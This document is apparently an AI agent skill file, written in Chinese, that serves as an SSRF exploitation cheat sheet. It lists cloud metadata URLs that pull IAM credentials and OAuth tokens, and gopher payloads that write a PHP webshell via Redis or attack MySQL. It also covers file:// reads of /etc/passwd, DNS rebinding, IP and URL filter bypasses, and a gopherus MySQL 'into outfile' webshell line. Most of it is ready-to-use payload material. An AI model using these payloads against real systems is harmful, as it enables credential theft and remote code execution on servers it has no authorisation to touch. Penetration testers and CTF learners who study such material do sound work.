---
name: ssrf-ssrf-detail
description: Use when encountering ssrf漏洞利用和内网探测技术
---

# 服务端请求伪造

## Info

- **Domain**: web
- **Tags**: web, ssrf, internal

# SSRF详细分类

## 1. 基础SSRF攻击

```python
?url=http://internal-server/
?url=file:///etc/passwd
?url=ftp://internal-server/
```

---

## 2. AWS元数据攻击

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/public-hostname
http://169.254.169.254/latest/meta-data/local-hostname
```

---

## 3. GCP元数据攻击

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

需要Header: `Metadata: true`

---

## 4. Azure元数据攻击

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute
http://169.254.169.254/metadata/instance/network
http://169.254.169.254/metadata/identity/oauth2/token
```

需要Header: `Metadata: true`

---

## 5. 协议利用

### Gopher协议

```
gopher://127.0.0.1:6379/_INFO
gopher://127.0.0.1:6379/_FLUSHALL
```

### Dict协议

```
dict://localhost:11211/stats
dict://127.0.0.1:3306/
```

### File协议

```
file:///etc/passwd
file:///var/www/html/config.php
```

### FTP协议

```
ftp://internal-server/secrets.txt
```

---

## 6. Gopher攻击Redis

```
gopher://127.0.0.1:6379/_SET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%0D%0A_CONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%0D%0A_CONFIG%20SET%20dbfilename%20shell.php%0D%0A_SAVE
```

---

## 7. Gopher攻击MySQL

```
gopher://127.0.0.1:3306/_%a5%00%00%01%8f%e0%00%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00%00mysql%20_native_password%00%02_password%00%0f%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
```

---

## 8. DNS重绑定

```
第一次解析: attacker.com -> 127.0.0.1 (白名单IP)
第二次解析: attacker.com -> 192.168.1.1 (内网IP)

使用: https://lock.cmpxchg8b.com/bind.php
```

---

## 9. 绕过技术

### IP地址变形

```
127.0.0.1
127.1
0x7f000001
2130706433 (十进制)
localhost
::1
```

### URL解析绕过

```
http://evil.com@127.0.0.1
http://127.0.0.1.evil.com
http://127。0。0。1
http://127.0.0.1.xip.io
```

### 协议跳转

```
dict://
gopher://
ftp://
```

---

## 10. SSRF利用场景

```
1. 分享: 通过URL地址分享网页内容
2. 转码服务: 通过URL把网页内容调优为适合手机屏幕的样式
3. 在线翻译: 通过URL地址翻译对应文本
4. 图片/文章收藏: 获取URL中title及内容作为显示
5. 未公开的API: 网站评分、获取远程XML文件
6. 图片加载与下载: 通过URL加载远程图片
7. URL关键字搜索: share, wap, url, link, src, source, target, u, display, sourceURL, imageURL, domain
```

---

## 11. PHP危险函数

### file_get_contents()
```php
<?php
$url = $_GET['url'];
echo file_get_contents($url);
?>
```

### fsockopen()
```php
<?php
function GetFile($host,$port,$link) {
    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);
    if (!$fp) {
        echo "$errstr (error number $errno) \n";
    } else {
        $out = "GET $link HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "Connection: Close\r\n\r\n";
        fwrite($fp, $out);
        $contents='';
        while (!feof($fp)) {
            $contents.= fgets($fp, 1024);
        }
        fclose($fp);
        return $contents;
    }
}
?>
```

### curl_exec()
```php
<?php
if (isset($_POST['url'])){
    $link = $_POST['url'];
    $curlobj = curl_init();
    curl_setopt($curlobj, CURLOPT_POST, 0);
    curl_setopt($curlobj,CURLOPT_URL,$link);
    curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);
    $result=curl_exec($curlobj);
    curl_close($curlobj);
    echo $result;
}
?>
```

### PHP注意事项
```
1. 一般情况下PHP不会开启fopen的gopher wrapper
2. file_get_contents的gopher协议不能URL编码
3. file_get_contents关于Gopher的302跳转会出现bug
4. curl/libcurl 7.43 上gopher协议存在bug(%00截断), 7.49可用
5. curl_exec() 默认不跟踪跳转
6. file_get_contents() 支持php://input协议
```

---

## 12. 协议详细说明

### file伪协议
```
file:///etc/passwd         - 读取passwd文件
file:///etc/hosts          - 显示当前网卡IP
file:///proc/net/arp       - 显示ARP缓存表(寻找内网主机)
file:///proc/net/fib_trie  - 显示当前网段路由信息
```

### dict伪协议
```
作用: 字典服务协议, 可用于扫描端口、获取内网信息、爆破密码
/?url=dict://127.0.0.1:8000   (端口爆破探测)
```

### gopher伪协议
```
利用范围广: GET提交、POST提交、redis、Fastcgi、SQL注入
gopher请求不转发第一个字符
端口探测: gopher://127.0.0.1:3306 返回数据延迟则存在端口

发送端: curl gopher://127.0.0.1/abcd  接收端: bcd
发送端: curl gopher://127.0.0.1/_abcd 接收端: abcd
```

### 其他协议
```
file://    - 从文件系统获取文件
dict://    - 字典服务协议, 默认端口6739
gopher://  - TCP包, 默认端口70
http://    - HTTP协议
sftp://    - SSH文件传输协议
ldap://    - 轻量级目录访问协议
tftp://    - 简单文件传输协议
```

---

## 13. Gopher GET/POST提交

### GET提交
```
gopher://127.0.0.1:80/_
GET /?name=Z3r4y HTTP/1.1
Host: www.example.com

(最后需要换行符, 需要两次URL编码)
```

### POST提交
```
gopher://127.0.0.1:80/_
POST /xxe.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 180
Content-Type: application/x-www-form-urlencoded

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE info [<!ENTITY name SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">]>
<info><name>&name;</name></info>

(从内容开始全编码, 内容和头之间空一行, 最后加%0D%0A)
```

### URL编码注意
```
换行符: %0D%0A (不是只有%0A)
HTTP包最后要加%0D%0A代表消息结束
需要两次URL编码: 手动编码后第二次不用再替换
编码工具: http://www.hiencode.com/url.html
```

---

## 14. 本地IP绕过

### 方法1: Enclosed Alphanumerics
```
127.⓪.⓪.1
```

### 方法2: IP地址转换
```
127.0.0.1 的不同进制表示:
2130706433 (十进制)     -> http://2130706433
017700000001 (八进制)   -> http://017700000001
0x7F000001 (十六进制)   -> http://0x7F000001
转换工具: https://www.metools.info/other/ipconvert162.html
```

### 方法3: 特殊语法
```
127.1              (Windows和Linux均可)
127。0。0。1       (Linux可用, 中文句号)
0 (Linux下0代表127.0.0.1, Windows下0代表0.0.0.0)
0.0.0.0            (代表所有IPv4)
```

### 方法4: 短网址绕过
```
使用短网址绕过长度限制: https://www.metools.info/master/shorturl180.html
```

### 方法5: 302重定向
```
http://xxx.com/302.php?schema=gopher&host=127.0.0.1&port=9000&query=xxxx
```

---

## 15. gopherus工具

```bash
# 使用Python2运行
python gopherus.py --exploit <target>

# 支持的攻击目标:
# MySQL (3306): 无密码时可dump数据库或放webshell
select "<?php eval($_POST[1]);?>" into outfile "/var/www/html/shell.php"

# PostgreSQL: 无密码时可dump数据库或放文件

# FastCGI (9000): 端口开放可获得RCE

# Redis (6379): 端口开放可覆盖系统文件

# Zabbix (10050): EnableRemoteCommands=1时可远程执行命令

# 生成payload后需要再次URL编码
```